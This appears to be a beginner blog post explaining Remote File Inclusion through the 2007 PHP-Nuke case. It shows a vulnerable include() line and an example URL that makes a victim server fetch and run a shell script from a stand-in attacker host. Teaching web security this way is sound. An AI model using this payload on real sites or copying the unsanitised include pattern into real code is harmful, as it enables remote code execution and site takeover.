# :globe_with_meridians: Remote File Inclusion Rfi Full Breakdown For Beginners 7F89C55E3B2A

---

## Real-World Case

In 2007, PHP-Nuke, a popular CMS, had a critical RFI bug that allowed attackers to inject shellcode and gain full control over websites.

## Get Shah kaif’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Sure — let’s break down what happened with PHP-Nuke in 2007 and explain the key elements of that RFI vulnerability so it makes sense, especially if you’re newer to exploitation or web app security.

## Background: What is PHP-Nuke?

PHP-Nuke was a very popular open-source content management system (CMS) written in PHP. It was used to build websites with modules like forums, news, downloads, and more.

But back then, security wasn’t top-tier, and many of the file inclusion and input-handling mechanisms were done *dynamically* with little to no filtering.

## The Vulnerability (RFI in PHP-Nuke)

The RFI (Remote File Inclusion) vulnerability affected modules and core files where user-controlled input was passed directly to PHP functions like `include()` or `require()`.

Here’s an example of the type of code you might have found:

```
include($module . ".php");
```

Let’s say the URL was:

```
http://victim.com/index.php?module=http://attacker.com/shell
```

PHP would fetch `http://attacker.com/shell.php`, include it, and execute it as if it was local PHP code.

---
